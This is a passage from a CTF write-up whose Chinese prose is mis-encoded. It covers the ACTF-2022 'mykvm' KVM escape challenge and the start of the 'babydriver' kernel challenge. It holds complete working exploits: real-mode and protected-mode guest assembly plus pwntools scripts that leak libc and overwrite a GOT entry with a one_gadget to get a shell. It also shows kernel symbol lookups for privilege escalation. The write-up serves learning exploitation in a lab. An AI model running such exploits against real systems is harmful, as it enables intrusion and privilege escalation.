  ioctl(vcpu, 0x8090AE81uLL, v9); // åˆå§‹åŒ–è™šæ‹Ÿ CPU çš„å¯„å­˜å™¨å€¼ã€‚
  guest_regs.rax = 0LL;
  v10 = 0x4000LL;
  guest_regs.rbx = 2LL;
  ioctl(vcpu, 0x4090AE82uLL, v9); // è®¾ç½®è™šæ‹ŸCPUçš„å€¼
  ioctl(vcpu, 0x8138AE83uLL, &guest_regs.rcx); //è·å–sregsçš„å€¼
  WORD2(guest_regs.rdx) = 0;
  guest_regs.rcx = 0LL;
  ioctl(vcpu, 0x4138AE84uLL, &guest_regs.rcx); //è®¾ç½®sregsçš„å€¼
  while ( 1 )
  {
    ioctl(vcpu, 0xAE80uLL, 0LL); //è¿™æ˜¯å‡½æ•°çš„æ ¸å¿ƒå¾ªç¯ï¼Œå®ƒä¸æ–­è¿è¡Œè™šæ‹Ÿæœºå¹¶æ ¹æ®ä¸åŒçš„é€€å‡ºåŸå› ï¼ˆä¾‹å¦‚ I/O æ“ä½œã€HLT æŒ‡ä»¤ç­‰ï¼‰è¿›è¡Œå¤„ç†ã€‚
    switch ( run_mem->exit_reason )
    {
      case 2u:
        putchar(*(&run_mem->request_interrupt_window + run_mem->io.data_offset));
        break;
      case 5u:
        fwrite("KVM_EXIT_HLT\n", 1uLL, 0xDuLL, stderr);
        return __readfsqword(0x28u) ^ v12;
      case 8u:
        errx(1, "KVM_EXIT_SHUTDOWN");
      case 9u:
        errx(1, "KVM_EXIT_FAIL_ENTRY: hardware_entry_failure_reason = 0x%llx", run_mem->hw.hardware_exit_reason);
      case 0x11u:
        errx(1, "KVM_EXIT_INTERNAL_ERROR: suberror = 0x%x", run_mem->ex.exception);
      default:
        errx(1, "Unhandled reason: %d", run_mem->exit_reason);
    }
  }
}
```

ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è¾“å…¥çš„codeä¼šä»æ ˆä¸Šmemcpyåˆ°bssæ®µçš„0x603000ä¸Šï¼Œè€Œè¿™ä¸ª0x603000åˆä¼šè¢«KVMå½“ä½œå†…å­˜çš„å¼€å§‹ï¼Œæˆ‘çš„codeå°±ç±»ä¼¼äºBIOSçš„å­˜åœ¨ã€‚

è¿™éƒ¨åˆ†å»ºè®®é˜…è¯»
ç”µè„‘æ˜¯å¦‚ä½•å¯åŠ¨çš„ï¼š<https://www.ruanyifeng.com/blog/2013/02/booting.html>

é‚£ä¹ˆæ¼æ´ç‚¹åœ¨å“ªå‘¢ï¼Œä¸»è¦æœ‰å‡ å¤„
1ã€é¦–å…ˆæ˜¯è™šæ‹Ÿæœºçš„å†…å­˜å¤§å°è®¾ç½®ä¸º0x40000000ï¼Œè€Œ0x603000~0x603000+0x40000000åŒ…å«äº†./mykvm(ä¸»ç¨‹åº)çš„å †åœ°å€ï¼Œè¿™å°±å¯¼è‡´è™šæ‹Ÿæœºèƒ½è®¿é—®ä¸»ç¨‹åºå †åœ°å€çš„å†…å®¹
2ã€ç”±äºæ˜¯å®æ¨¡å¼16ä½å¯»å€ï¼Œå³2å­—èŠ‚ï¼Œå®æ¨¡å¼åˆ©ç”¨ä¸€ç§ç§°ä¸º"æ®µ:åç§»"çš„æ–¹å¼æ¥æ‰©å±•å¯»å€èƒ½åŠ›ï¼Œæœ€å¤§èƒ½å¤Ÿå¯»å€1MBï¼ˆ2^20å­—èŠ‚ï¼‰çš„ç‰©ç†å†…å­˜ï¼Œä¹Ÿå°±æ˜¯20ä½å¯»å€ï¼Œ0x00000 åˆ° 0xFFFFFã€‚æ„å‘³ç€è™šæ‹Ÿæœºå®é™…èƒ½æ“ä½œçš„èŒƒå›´ä¸º0x603000~0x603000+0xFFFFFï¼Œè¿™ä»ç„¶å¯èƒ½åŒ…æ‹¬å †åœ°å€ï¼Œå †ä¸­ä¼šæœ‰ä¸€äº›main_arenaçš„åœ°å€
3ã€readlineå‡½æ•°æ˜¯libreadline.so.6ä¸­çš„ä¸€ä¸ªåº“å‡½æ•°
```c
void *__fastcall sub_400F28(__int64 a1)
{
  if ( ptr )
  {
    free(ptr);
    ptr = 0LL;
  }
  ptr = (void *)readline(a1);
  if ( ptr && *(_BYTE *)ptr )
    add_history((__int64)ptr);
  return ptr;
}
```

readline() çš„å‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¼šå…ˆè¾“å‡ºå†è¯»å–ä¸€è¡Œè¾“å…¥ï¼Œç„¶åè¿”å›ä¸€ä¸ªå †å—æŒ‡é’ˆã€‚åŸåˆ™ä¸Šéœ€è¦freeã€‚è¿™é‡Œä¹Ÿæ²¡æœ‰freeï¼Œè¿ç»­ä¸‰æ¬¡çš„readline()å¯ä»¥ä½¿ç”¨åŒä¸€ä¸ªå †å—ï¼Œç»“åˆæˆ‘ä»¬è™šæ‹Ÿæœºèƒ½æ“ä½œä¸»ç¨‹åºå †æ®µçš„æ¼æ´ï¼Œå°±å¯ä»¥æ§åˆ¶è¾“å…¥çš„å†…å®¹(æœ¬æ¥å¯ä»¥ç”¨æˆ·æ§åˆ¶ï¼Œè¿™é‡Œæ˜¯æŒ‡è™šæ‹Ÿæœºæ§åˆ¶)ã€‚readline()å‡½æ•°ä¼šå°†\x7fä½œä¸ºDeleteä¿¡å·è¯†åˆ«ï¼Œæ‰€ä»¥è¾“å…¥çš„å†…å®¹è¦æ§åˆ¶æ²¡æœ‰"7f"

4ã€ä¸»å‡½æ•°é‡Œè¯»å…¥codeçš„æ—¶å€™é‡‡ç”¨scanfè¯»å…¥ï¼ŒåŸåˆ™ä¸Šè¿™æ®µcodeä¼šè¢«è¯»å…¥æ ˆä¸Šï¼Œç„¶åè¢«memcpyåˆ°0x603000ï¼Œè€Œmemcpyä¸ä¼šè¢«é›¶æˆªæ–­ï¼Œè¿™æ ·ä»¥æ¥æ ˆä¸Šçš„ä¸€äº›å€¼å°±ä¼šè¢«æ”¾åˆ°bssé‡Œ
```c
    puts("your code size: ");
    __isoc99_scanf("%d", codesize);
    if ( codesize[0] <= 4096 )
```


è¿™é‡Œè®²ä¸€ä¸‹é¢˜ç›®çš„å¯åŠ¨å’Œè°ƒè¯•ï¼Œç”±äºé¢˜ç›®ç»™äº†dockerç¯å¢ƒï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥ä½¿ç”¨dockerè¿›è¡Œè°ƒè¯•

```shell
docker build -t mykvm .
docker run --privileged --rm -p 8000:8888 -p 1234:1234 -d  mykvm:latest
# --privilegedå‚æ•°ç”¨äºæ”¯æŒKVM
è¿è¡Œå¸¦æœ‰pause()çš„è„šæœ¬

sudo gdb -p `pidof mykvm`
```


é¦–å…ˆæ˜¯æ³„éœ²libcï¼Œå¦‚æœæ³„éœ²ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œé€šè¿‡outæŒ‡ä»¤å®ç°ï¼Œè¿™ä¹Ÿç®—æ˜¯å®˜æ–¹WPçš„å®ç°<https://github.com/team-s2/ACTF-2022/blob/main/pwn/mykvm/exploits/exp.py>

```python
shellcode = asm('''
    .code16
    mov al, 0x57  ;"W"
    mov dx, 0x217 ;è¿™é‡Œæµ‹è¯•ä¸ºä»»ä½•å€¼éƒ½å¯ä»¥
    out dx, al
    mov al, 10 ;"/n"
    out dx, al
    hlt
''')
```

è¯»ç«¯å£ç”¨INæŒ‡ä»¤ï¼Œå†™ç«¯å£ç”¨OUTæŒ‡ä»¤

```c
IN AL,21Hï¼›è¡¨ç¤ºä»21Hç«¯å£è¯»å–ä¸€å­—èŠ‚æ•°æ®åˆ°AL

IN AX,21Hï¼›è¡¨ç¤ºä»ç«¯å£åœ°å€21Hè¯»å–1å­—èŠ‚æ•°æ®åˆ°ALï¼Œä»ç«¯å£åœ°å€22Hè¯»å–1å­—èŠ‚åˆ°AH

MOV DX,379H
IN AL,DX ï¼›ä»ç«¯å£379Hè¯»å–1å­—èŠ‚åˆ°AL


OUT 21H,ALï¼›å°†ALçš„å€¼å†™å…¥21Hç«¯å£
OUT 21H,AXï¼›å°†AXçš„å€¼å†™å…¥ç«¯å£åœ°å€21Hå¼€å§‹çš„è¿ç»­ä¸¤ä¸ªå­—èŠ‚ã€‚ï¼ˆport[21H]=AL,port[22h]=AHï¼‰

MOV DX,378H
OUT DX,AX ï¼›å°†AHå’ŒALåˆ†åˆ«å†™å…¥ç«¯å£379Hå’Œ378H
```

è¿™é‡Œè¦è€ƒè™‘å¦‚ä½•å»æœ€ç»ˆè·å–shellï¼Œç»“åˆgotè¡¨å¯å†™å’Œlibc-2.23ï¼Œå¯ä»¥è€ƒè™‘åŠ«æŒgotè¡¨ä¸ºone_gadgetï¼Œæ¯”å¦‚putsï¼Œåœ¨ä¸»ç¨‹åºçš„æœ€åä¼šè¾“å…¥hostnameå¯¹ä¸»ç¨‹åºbssæ®µä¸Šçš„destå˜é‡è¿›è¡Œå†™å…¥ï¼Œé‚£æ˜¯ä¸€ä¸ªbssæ®µå˜é‡

```c
      memcpy(dest, *&codesize[1], 0x20uLL);
      puts("Bye!");
```

è¿™é‡Œçœ‹ä¸€ä¸‹memcpyçš„åŸå‹ï¼Œå…¶å‚æ•°ä¸º2ä¸ªæŒ‡é’ˆï¼Œæ„å‘³ç€æ•°æ®ä¼šè¢«copyåˆ°destæŒ‡å‘çš„å †å—ä¸­

```c
void *memcpy(void *dest, const void *src, size_t n);
```

è€Œdest 0x60A100æ­£å¥½åœ¨è™šæ‹Ÿæœºå†…å­˜èŒƒå›´å†…ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶æ”¹ä¸ºgotè¡¨çš„åœ°å€ï¼Œç„¶åå†ç¯¡æ”¹è¯»readlineè¯»å…¥å †å—é‡Œçš„å†…å®¹(å®æµ‹åªä¼šæ¸…ç©ºå‰8å­—èŠ‚çš„å†…å®¹)ï¼Œè¿™æ ·å°±èƒ½ä¿®æ”¹äº†ã€‚
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231229110828.png)
å†™æ±‡ç¼–çš„æ€è·¯ï¼š
å…ˆæ‹¿ä¸€ä¸ªå †åœ°å€æ£€æµ‹æ˜¯å¦å †æ®µåœ¨1MèŒƒå›´å†…ï¼Œåœ¨çš„è¯å°±æ‰§è¡Œåç»­payloadï¼Œä¸åœ¨å°±æ§åˆ¶è¾“å‡ºæ¥å¯¼å‘æ–°çš„remote
å…ˆå»æ ˆä¸Šæ‹¿ä¸€ä¸ªlibcåœ°å€ï¼Œç„¶åæ”¾åˆ°bssæ®µä¸Š
ç„¶åå†å»æ‹¿destå †å—çš„åœ°å€ï¼Œè¿™ä¸ªåœ¨bssæ®µä¸Šï¼Œé€šè¿‡å­—ç¬¦ä¸²æœç´¢æœç´¢åˆ°å¯¹åº”çš„readlineå †å—çš„åœ°å€ï¼Œå¤„ç†åä¹Ÿæ”¾åˆ°bssæ®µä¸Š
ç„¶åè®¡ç®—å‡ºone_gadgetçš„åœ°å€ï¼Œå°†å…¶èµ‹å€¼ç»™readlineå †å—+8ï¼Œå†å°†destçš„å€¼æ¢æˆputcharçš„gotè¡¨åœ°å€
è¿™é‡Œåœ¨å¯¹readlineå †å—+8å †å—èµ‹å€¼æ—¶ï¼Œç”±äºå®æµ‹è¿™ä¸ªåœ°å€å¤§æ¦‚ä¸º0x0157f8(KVMåœ°å€)ï¼Œè¶…è¿‡äº†å®æ¨¡å¼2å­—èŠ‚çš„å¯»å€èŒƒå›´ï¼Œæ‰€ä»¥è¦ç”¨dsæ®µå¯„å­˜å™¨è¿›è¡Œå¯»å€

EXP

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("127.0.0.1",8000) #typ="udp"
# p = process("./bin/mykvm")
# elf = ELF("./mykvm")
# libc = elf.libc

# context.log_level = "debug" # info
# context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

p = remote("127.0.0.1",8000)

# libc in stack
# heap_input
# heap+8 in kvm
# got

code = asm('''
    .code16gcc
    jmp main
    .rept 40
    .byte 0x00
    .endr

main:
    mov eax,[0x7100]   
    sub eax,0x603000
    cmp eax,0xfd800
    jb next
    mov ebx,0
    div eax,ebx 

next:
    mov ebx, [0x568]
    add ebx,0x2270cf
    mov [0x7200], ebx
    mov ebx,[0x56c]
    mov [0x7204], ebx

    mov ebx,[0x7100]
    add ebx,0x27e0
    mov [0x7220],ebx

    mov edx,[0x7200]
    add edx,0x4527a	
    push edx

    add ebx,0x8	
    sub ebx,0x603000
    mov eax,ebx

    shr eax,16
    shl eax,12
    mov ds,eax			
    pop edx
    mov ds:[bx],edx

    mov ebx,0x602020
    mov eax,0
    mov ds,eax
    mov [0x7100],ebx
    hlt
''')


c = 1
while c:
    # pause()
    sla("your code size: ",4096)
    sla("your code:",code)
    sla("guest name:",'e4l4')
    sla("guest passwd:",'e4l4')
    # sla("host name: ",'e4l4')
    p.recvline()
    ret = r(0x1b)
    if "mykvm" not in ret:
	    # pause()
        c = 0
        print("got it!!!")
        sl("e4l4")
        break        
    p.close()
    p = remote("127.0.0.1",8000)
    
ia()
```

å®˜æ–¹çš„é¢˜è§£æ˜¯ä»16ä½å®æ¨¡å¼åˆ‡æ¢åˆ°32ä½ä¿æŠ¤æ¨¡å¼å†è¿›è¡Œåˆ©ç”¨ï¼Œè¿™é‡Œä¹Ÿè¿›è¡Œè¿›ä¸€æ­¥çš„å­¦ä¹ 
ä»€ä¹ˆæ˜¯å®æ¨¡å¼å’Œä¿æŠ¤æ¨¡å¼ï¼š<https://www.cnblogs.com/kelamoyujuzhen/p/10555924.html>
linuxåˆ†é¡µçš„æœºåˆ¶ï¼š<https://zhuanlan.zhihu.com/p/458935522>
è¯¦ç»†å†…å®¹å‚è€ƒï¼š16ä½å®æ¨¡å¼åˆ‡æ¢32ä½ä¿æŠ¤æ¨¡å¼è¿‡ç¨‹è¯¦è§£:https://bbs.kanxue.com/thread-269223.htm


> [!NOTE] ç¬”è®°
> 16ä½å¯»å€ 2å­—èŠ‚ 0x1234  20ä½ 0x1234567
> 32ä½å¯»å€ 4å­—èŠ‚ 0x12345678
> 3ä¸ª16è¿›åˆ¶æ•°èƒ½è¡¨ç¤ºçš„èŒƒå›´æ­£å¥½å°±æ˜¯4KBï¼Œå³ä¸€é¡µ
> é€»è¾‘åœ°å€ â€“[åˆ†æ®µ]â€“ã€‹ çº¿æ€§åœ°å€ â€“[åˆ†é¡µ]â€“ã€‹ ç‰©ç†åœ°å€
> 
> 
> 

ä¸¤ä¸ªè¿›ç¨‹è™šæ‹Ÿåœ°å€ç›¸åŒï¼Œæ˜ å°„çš„ç‰©ç†åœ°å€ä¹Ÿæ˜¯ä¸åŒçš„

```
è™šæ‹Ÿå†…å­˜:  [é¡µ0] [é¡µ1] [é¡µ2] [é¡µ3]
ç‰©ç†å†…å­˜: [é¡µA] [é¡µB] [é¡µC] [é¡µD]


é¡µè¡¨:
| è™šæ‹Ÿé¡µå· | ç‰©ç†é¡µå· | æ ‡å¿— |
|----------|----------|------|
|    0     |    B     |  RW  |
|    1     |    A     |  R   |
|    2     |    D     |  RW  |
|    3     |    C     |  R   |
```

æ®µæ ‡è¯†ç¬¦é•¿8å­—èŠ‚ï¼Œ16ä½å®æ¨¡å¼é€šè¿‡GDTå…¨å±€æè¿°ç¬¦è¡¨å¯»å€ï¼Œ16ä½æ­£å¥½è¡¨ç¤ºä¸‹æ ‡

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231228134405.png)

ä¸€èˆ¬ä¼šåœ¨MBR(â€è¿™æœ€å‰é¢çš„512ä¸ªå­—èŠ‚ï¼Œå°±å«åš"ä¸»å¼•å¯¼è®°å½•"ï¼ˆMaster boot recordï¼Œç¼©å†™ä¸ºMBRï¼‰â€œ)è½½å…¥å¯åŠ¨ç®¡ç†å™¨ä¸­è¿›è¡Œå®æ¨¡å¼åˆ°ä¿æŠ¤æ¨¡å¼çš„åˆ‡æ¢ã€‚ç„¶åå°±èƒ½è£…è½½åŠ è½½å†…æ ¸çš„ç¨‹åºäº†
ä»å®æ¨¡å¼åˆ‡æ¢åˆ°ä¿æŠ¤æ¨¡å¼å¤§è‡´å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š
å±è”½ä¸­æ–­
åˆå§‹åŒ–å…¨å±€æè¿°ç¬¦è¡¨ï¼ˆGDTï¼‰
å°†CR0å¯„å­˜å™¨æœ€ä½ä½ç½®1
æ‰§è¡Œè¿œè·³è½¬
åˆå§‹åŒ–æ®µå¯„å­˜å™¨å’Œæ ˆæŒ‡é’ˆ

å®é™…ä¸Šå¯ä»¥ç®€åŒ–ä¸ºä¸€ä¸ªæ¨¡æ¿
```c
org 0 
cli                     ; å±è”½ä¸­æ–­
 
lgdt [gdt_descriptor]   ; åˆå§‹åŒ–GDT
 
; æŠŠ cr0 çš„æœ€ä½ä½ç½®ä¸º 1ï¼Œå¼€å¯ä¿æŠ¤æ¨¡å¼
mov eax, cr0
or eax, 0x1
mov cr0, eax
jmp 08h:PModeMain
 
[bits 32]
PModeMain:
    mov ax, 0x10        ; å°†æ•°æ®æ®µå¯„å­˜å™¨dså’Œé™„åŠ æ®µå¯„å­˜å™¨esç½®ä¸º0x10
    mov ds, ax         
    mov es, ax
    mov fs, ax          ; fså’Œgså¯„å­˜å™¨ç”±æ“ä½œç³»ç»Ÿä½¿ç”¨ï¼Œè¿™é‡Œç»Ÿä¸€è®¾æˆ0x10
    mov gs, ax
    mov ax, 0x18        ; å°†æ ˆæ®µå¯„å­˜å™¨ssç½®ä¸º0x18
    mov ss, ax
    mov ebp, 0x7c00     ; ç°åœ¨æ ˆé¡¶æŒ‡å‘ 0x7c00
    mov esp, ebp

	xxx
    hlt

gdt_start:
; ç¬¬ä¸€ä¸ªæè¿°ç¬¦å¿…é¡»æ˜¯ç©ºæè¿°ç¬¦
gdt_null:
    dd 0
    dd 0
; ä»£ç æ®µæè¿°ç¬¦
gdt_code:
    dw 0xffff ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10011010b ; Access Byte
    db 11001111b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
; æ•°æ®æ®µæè¿°ç¬¦
gdt_data:
    dw 0xffff ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10010010b ; Access Byte
    db 11001111b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
; æ ˆæ®µæè¿°ç¬¦
gdt_stack:
    dw 0x7c00 ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10010010b ; Access Byte
    db 01000000b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
gdt_end:
 
; GDT descriptior
gdt_descriptor:
dw gdt_end - gdt_start - 1 ; Size of our GDT, always less one of the true size
dd gdt_start ; Start address of our GDT
```

è§£é™¤äº†å¯»å€ä¸º1Mçš„é™åˆ¶ï¼Œä¹Ÿå°±ä¸ç”¨å†çˆ†ç ´åœ°å€äº†,ä¹Ÿèƒ½ç›´æ¥èµ‹å€¼ç»™0x1f5bb58è¿™æ ·çš„åœ°å€äº†

exp.asm
```c
org 0 
cli                     ; å±è”½ä¸­æ–­
 
lgdt [gdt_descriptor]   ; åˆå§‹åŒ–GDT
 
; æŠŠ cr0 çš„æœ€ä½ä½ç½®ä¸º 1ï¼Œå¼€å¯ä¿æŠ¤æ¨¡å¼
mov eax, cr0
or eax, 0x1
mov cr0, eax
jmp 08h:PModeMain
times 40 db 0x00
; .endr

[bits 32]
PModeMain:
    mov ax, 0x10        ; å°†æ•°æ®æ®µå¯„å­˜å™¨dså’Œé™„åŠ æ®µå¯„å­˜å™¨esç½®ä¸º0x10
    mov ds, ax         
    mov es, ax
    mov fs, ax          ; fså’Œgså¯„å­˜å™¨ç”±æ“ä½œç³»ç»Ÿä½¿ç”¨ï¼Œè¿™é‡Œç»Ÿä¸€è®¾æˆ0x10
    mov gs, ax
    mov ax, 0x18        ; å°†æ ˆæ®µå¯„å­˜å™¨ssç½®ä¸º0x18
    mov ss, ax
    mov ebp, 0x7c00     ; ç°åœ¨æ ˆé¡¶æŒ‡å‘ 0x7c00
    mov esp, ebp

    mov ebx, [0x7100]
    add ebx, 0x1b48
    sub ebx, 0x603000
    mov edx, [ebx]		
    sub edx, 0x3c51a8	
    add edx, 0x4527a	; gadget addr
        
    mov  [0x7200], edx
        
    mov ebx, [0x7100]
    add ebx, 0x27e0		; target &nbytes addr
    add ebx, 0x8
    sub ebx, 0x603000	; memcpy arg1 -> &nbytes

    ; pop edx
    mov  edx, [0x7200]
    mov [ebx], edx      ; gadget to &nbytes

    mov ecx, 0x602020
    mov [0x7100],ecx        ; memcpy arg0 -> 0x602020
    hlt


gdt_start:
; ç¬¬ä¸€ä¸ªæè¿°ç¬¦å¿…é¡»æ˜¯ç©ºæè¿°ç¬¦
gdt_null:
    dd 0
    dd 0
; ä»£ç æ®µæè¿°ç¬¦
gdt_code:
    dw 0xffff ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10011010b ; Access Byte
    db 11001111b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
; æ•°æ®æ®µæè¿°ç¬¦
gdt_data:
    dw 0xffff ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10010010b ; Access Byte
    db 11001111b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
; æ ˆæ®µæè¿°ç¬¦
gdt_stack:
    dw 0x7c00 ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10010010b ; Access Byte
    db 01000000b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
gdt_end:
 
; GDT descriptior
gdt_descriptor:
dw gdt_end - gdt_start - 1 ; Size of our GDT, always less one of the true size
dd gdt_start ; Start address of our GDT
```

exp.py
```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

p = remote("127.0.0.1","8000") #typ="udp"
# p = process("./pwn")
elf = ELF("./mykvm")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------


with open("./exp.bin", "rb") as f:
    shellcode = f.read()

# pause()
sla("your code size: ",len(shellcode))
sa("your code:",shellcode)
sla("guest name:",'aaaa')
sla("guest passwd:",'bbbb')
sla("host name: ",'cccc')


ia()
```


### babydriver

ä¸€é“å†…æ ¸çš„å…¥é—¨é¢˜ç›®ï¼Œé¦–å…ˆæ£€æŸ¥ä¿¡æ¯
```shell
qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1'  -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -enable-kvm
```

å¼€å¯äº†smepï¼Œæ²¡æœ‰å¼€å¯kaslr

æå–æ–‡ä»¶ç³»ç³»ç»Ÿï¼Œå…³æ³¨å…¶å¯åŠ¨æ–‡ä»¶ init

```shell
excpio rootfs.cpio
```

```shell
âœ  rootfs cat init
#!/bin/sh

mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
chown root:root flag
chmod 400 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /lib/modules/4.4.72/babydriver.ko
chmod 777 /dev/babydev
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0  -f
```

åŠ è½½äº†ä¸€ä¸ªå†…æ ¸æ¨¡å—babydriver.ko(å…³äºå†…æ ¸æ¨¡å—çš„ç¼–å†™è¿™é‡Œå¯ä»¥ä¸“é—¨å­¦ä¹ ä¸€ä¸‹)ï¼Œå†…æ ¸ç‰ˆæœ¬4.4.72

ä¹Ÿå¯ä»¥å¯åŠ¨ä»¥åå†æŸ¥çœ‹ï¼ŒåŒæ—¶ç”±äºæ²¡æœ‰å¼€å¯kalsrï¼Œæˆ‘ä»¬æå–ä¸€ä¸‹å‡½æ•°ç¬¦å·è¡¨

```
/ $ lsmod
babydriver 16384 0 - Live 0xffffffffc0000000 (OE)

cat /proc/kallsyms > /tmp/kallsyms.txt
cat /tmp/kallsyms.txt | grep "prepare_kernel_cred"
cat /tmp/kallsyms.txt | grep "commit_creds"

ffffffff810a1810 T prepare_kernel_cred
ffffffff81d91890 R __ksymtab_prepare_kernel_cred
ffffffff81dac968 r __kcrctab_prepare_kernel_cred
ffffffff81db9450 r __kstrtab_prepare_kernel_cred

ffffffff810a1420 T commit_creds
ffffffff81d88f60 R __ksymtab_commit_creds
ffffffff81da84d0 r __kcrctab_commit_creds
ffffffff81db948c r __kstrtab_commit_creds
```

ç„¶åå°±æ˜¯åˆ†æbabydriver.koè¿™ä¸ªæ¨¡å—äº†

```c
int __cdecl babydriver_init()
{
  int v0; // edx
  int v1; // ebx
  class *v2; // rax
  __int64 v3; // rax

  if ( alloc_chrdev_region(&babydev_no, 0LL, 1LL, "babydev") >= 0 )//ä¸ºè®¾å¤‡åˆ†é…ä¸€ä¸ªä¸»è®¾å¤‡å·å’Œä¸€ä¸ªæ¬¡è®¾å¤‡å·,babydev_no å°†å­˜å‚¨åˆ†é…çš„è®¾å¤‡å·
  {
    cdev_init(&cdev_0, &fops);//åˆå§‹åŒ–å­—ç¬¦è®¾å¤‡å¹¶å°†å…¶ä¸æ–‡ä»¶æ“ä½œç»“æ„ä½“ fops å…³è”
    cdev_0.owner = &_this_module;
    v1 = cdev_add(&cdev_0, babydev_no, 1LL);//å°†è®¾å¤‡åŠ å…¥ç³»ç»Ÿ
    if ( v1 >= 0 )
    {
      v2 = _class_create(&_this_module, "babydev", &babydev_no);//åˆ›å»ºä¸€ä¸ªæ–°çš„è®¾å¤‡ç±»ï¼Œè¿™ä¸ªç±»åœ¨ /sys/class ä¸‹å¯¹åº”ä¸€ä¸ªç›®å½•ï¼Œ/sys/class/babydev
      babydev_class = v2;
      if ( v2 )
      {
        v3 = device_create(v2, 0LL, babydev_no, 0LL, "babydev");//ï¼ï¼ï¼åˆ›å»ºäº†ä¸€ä¸ªè®¾å¤‡èŠ‚ç‚¹ï¼Œé€šå¸¸åœ¨ /dev ç›®å½•ä¸‹ã€‚è¿™ä½¿å¾—ç”¨æˆ·ç©ºé—´çš„ç¨‹åºå¯ä»¥é€šè¿‡è®¾å¤‡æ–‡ä»¶ä¸é©±åŠ¨ç¨‹åºè¿›è¡Œäº¤äº’ã€‚
        v0 = 0;
        if ( v3 )
          return v0;
        printk(&unk_351);
        class_destroy(babydev_class);
      }
      else
      {
        printk(&unk_33B);
      }
      cdev_del(&cdev_0);
    }
    else
    {
      printk(&unk_327);
    }
    unregister_chrdev_region(babydev_no, 1LL);
    return v1;
  }
  printk(&unk_309);
  return 1;
}
```

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240102110359.png)

